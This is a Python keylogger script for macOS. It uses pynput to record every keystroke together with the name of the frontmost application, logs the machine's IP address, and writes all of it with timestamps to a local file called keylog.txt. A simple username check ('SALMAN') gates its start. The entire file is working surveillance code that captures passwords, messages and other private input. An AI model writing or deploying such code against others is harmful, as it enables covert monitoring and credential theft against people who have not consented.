import logging
from pynput.keyboard import Key, Listener
import socket
import subprocess
import time

log_file = "keylog.txt"
log_dir = ""

def get_ip_address():
    try:
        # Connect to a public DNS server to get the correct IP (handles external IP better)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Connecting to a public DNS server
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address
    except Exception as e:
        return "Unable to get IP: " + str(e)

def get_active_window():
    try:
        script = 'tell application "System Events" to get name of application processes whose frontmost is true'
        active_window_name = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
        if active_window_name.returncode == 0:
            return active_window_name.stdout.strip()
        else:
            return "Unknown Application"
    except Exception as e:
        return "Error retrieving window: " + str(e)

logging.basicConfig(filename=(log_dir + log_file), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: [%(message)s]')

logging.info(f"Logging started on system with IP: {get_ip_address()}")

def on_press(key):
    try:
        window_title = get_active_window()
        logging.info(f"{window_title} | {key.char}")
    except AttributeError:
        window_title = get_active_window()
        logging.info(f"{window_title} | {str(key)}")


def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Main function to ask for username
def main():
    username = input("Enter username: ")

    # Check if the username is 'SALMAN'
    if username == "SALMAN":
        print("Access granted. Starting keylogger...")
        start_keylogger()
    else:
        print("Access denied. Exiting...")

# Run the keylogger only if the correct username is provided
if __name__ == "__main__":
    main()


